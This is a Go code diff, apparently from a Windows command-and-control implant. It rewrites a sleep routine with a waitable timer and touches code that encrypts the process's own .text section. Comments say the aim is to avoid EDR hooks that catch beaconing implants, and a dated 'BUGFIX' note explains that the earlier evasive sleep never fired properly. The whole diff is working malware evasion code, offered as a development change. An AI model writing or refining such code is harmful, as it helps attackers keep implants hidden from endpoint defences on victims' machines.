@@ -74,7 +74,7 @@ func getCurrentModuleTextSection() (*textSectionInfo, error) {
 	}
 
 	// Get the module handle of the current process image
-	moduleHandle, err := windows.GetModuleHandle(nil)
+	moduleHandle, err := winGetModuleHandleSelf()
 	if err != nil {
 		return nil, err
 	}
@@ -82,7 +82,7 @@ func getCurrentModuleTextSection() (*textSectionInfo, error) {
 		return nil, errors.New("GetModuleHandle returned NULL")
 	}
 
-	base := uintptr(moduleHandle)
+	base := moduleHandle
 
 	// Read the DOS signature at offset 0 (should be "MZ" = 0x5A4D)
 	dosMagic := *(*uint16)(unsafe.Pointer(base))
@@ -193,50 +193,33 @@ func decryptTextSection(key []byte) error {
 	return encryptTextSection(key)
 }
 
-// createTimerQueueSleep uses CreateTimerQueueTimer + WaitForSingleObject to
-// implement a sleep that is harder to detect than a simple Sleep() call.
-// This avoids the classic "SleepEx with alertable I/O" pattern that EDR
-// hooks look for in beaconing implants.
+// createTimerQueueSleep uses a waitable timer (CreateWaitableTimerExW +
+// SetWaitableTimer + WaitForSingleObject) to implement a sleep that is harder
+// to detect than a simple Sleep()/SleepEx call. SleepEx with alertable I/O is
+// the classic pattern EDR hooks watch for in beaconing implants.
+//
+// BUGFIX (Aug 2026): the previous implementation created a timer-queue timer
+// with a NULL callback and waited on an event that nothing ever signaled —
+// every sleep blocked for the full wait timeout (duration + 5s). The waitable
+// timer below is actually signaled by the kernel when the due time elapses.
 func createTimerQueueSleep(duration time.Duration) error {
-	// Create an auto-reset event for signaling completion
-	event, err := windows.CreateEvent(nil, 0, 0, nil)
+	timer, err := winCreateWaitableTimer()
 	if err != nil {
 		return err
 	}
-	defer windows.CloseHandle(event)
+	defer windows.CloseHandle(timer)
 
-	// Create a timer queue
-	timerQueue, err := windows.CreateTimerQueue()
-	if err != nil {
+	if err := winSetWaitableTimer(timer, duration.Nanoseconds()); err != nil {
 		return err
 	}
-	defer windows.DeleteTimerQueueEx(timerQueue, windows.INVALID_HANDLE_VALUE)
 
-	// Create a one-shot timer that fires after `duration`
-	dueTime := uint32(duration / time.Millisecond)
-	var timer windows.Handle
-	err = windows.CreateTimerQueueTimer(
-		&timer,
-		timerQueue,
-		0, // callback = NULL (we use the event wait instead)
-		0,
-		dueTime,
-		0, // period = 0 (one-shot)
-		0,
-	)
-	if err != nil {
-		return err
-	}
-	if timer == 0 {
-		return errors.New("CreateTimerQueueTimer returned NULL timer")
-	}
-	defer windows.DeleteTimerQueueTimer(timerQueue, timer, windows.INVALID_HANDLE_VALUE)
-
-	// Wait for the timer (with a generous timeout buffer)
+	// Wait for the timer to fire (generous timeout buffer)
 	waitMs := uint32(duration/time.Millisecond) + 5000
-	_, err = windows.WaitForSingleObject(event, waitMs)
-	// WAIT_TIMEOUT or WAIT_FAILED is acceptable — the sleep served its purpose
-	_ = err
+	event, err := windows.WaitForSingleObject(timer, waitMs)
+	if err != nil {
+		return err
+	}
+	_ = event
 	return nil
 }
 
